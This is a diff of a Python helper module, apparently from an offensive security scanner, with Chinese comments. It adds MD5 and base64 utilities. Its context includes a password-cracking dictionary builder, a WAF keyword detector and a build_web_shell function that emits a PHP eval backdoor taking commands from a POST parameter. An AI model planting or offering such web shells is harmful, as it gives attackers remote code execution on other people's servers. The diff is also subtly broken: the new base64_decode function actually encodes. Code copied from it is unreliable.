@@ -1,3 +1,4 @@
+import hashlib
 import os
 import re
 import json
@@ -7,49 +8,78 @@ import string
 from flashtext import KeywordProcessor
 
 
-def build_random_str(length=8):
-    """ 随机字符串 """
+def build_md5_str(source):
+    """ 生成md5字符串 """
+    return hashlib.md5(source.encode()).hexdigest()
 
-    return ''.join(random.sample(string.ascii_letters, length))
+
+MD5 = build_md5_str
+
+
+def build_random_str(length=8):
+    """ 生成随机字符串 """
+
+    return ''.join(random.sample(string.ascii_letters, int(length)))
+
+
+randomStr = build_random_str
 
 
 def build_random_lower_str(length=8):
-    """ 随机小写字符串 """
+    """ 生成随机小写字符串 """
 
-    return ''.join(random.sample(string.ascii_lowercase, length))
+    return ''.join(random.sample(string.ascii_lowercase, int(length)))
 
 
 randomLowercase = build_random_lower_str
 
 
 def build_random_upper_str(length=8):
-    """ 随机大写字符串 """
+    """ 生成随机大写字符串 """
 
-    return ''.join(random.sample(string.ascii_uppercase, length))
+    return ''.join(random.sample(string.ascii_uppercase, int(length)))
 
 
 randomUppercase = build_random_upper_str
 
 
 def build_random_int(min_length=8, max_length=16):
-    """ 随机整数 """
+    """ 生成随机整数 """
 
-    return random.randint(min_length, max_length)
+    return random.randint(int(min_length), int(max_length))
 
 
 randomInt = build_random_int
 
-base64 = b64.b64encode
+
+def base64_encode(source):
+    """ base64编码 """
+    if isinstance(source, str):
+        source = source.encode('utf-8')
+    return b64.b64encode(source).decode()
+
+
+base64Encode = base64_encode
+
+
+def base64_decode(source):
+    """ base64解码 """
+    if isinstance(source, str):
+        source = source.encode('utf-8')
+    return b64.b64encode(source).decode()
+
+
+base64Decode = base64_decode
 
 
 def jsonp_to_json(jsonp_str):
-    """ jsonp转json """
+    # jsonp转json
 
     return json.loads(re.match(".*?({.*}).*", jsonp_str, re.S).group(1))
 
 
 def is_exist_waf(content):
-    """" 判断waf """
+    # 判断waf
     kp = KeywordProcessor()
     kp.add_keywords_from_list(
         [
@@ -64,7 +94,7 @@ def is_exist_waf(content):
 
 
 def build_login_dict(method=1, username='admin', password='admin'):
-    """ 构建口令破解字典 """
+    # 构建口令破解字典
     if os.path.isfile(username):
         with open(username, encoding='utf-8') as f:
             username_list = [line.strip() for line in f]
@@ -111,7 +141,7 @@ def string_split(value) -> list:
 
 
 def build_web_shell(lang='php') -> tuple:
-    """ 生成WebShell """
+    # 生成WebShell
     code, password = '', build_random_str(8)
     if lang == 'php':
         code = '<?php @eval($_POST["{}"]);?>'.format(password)
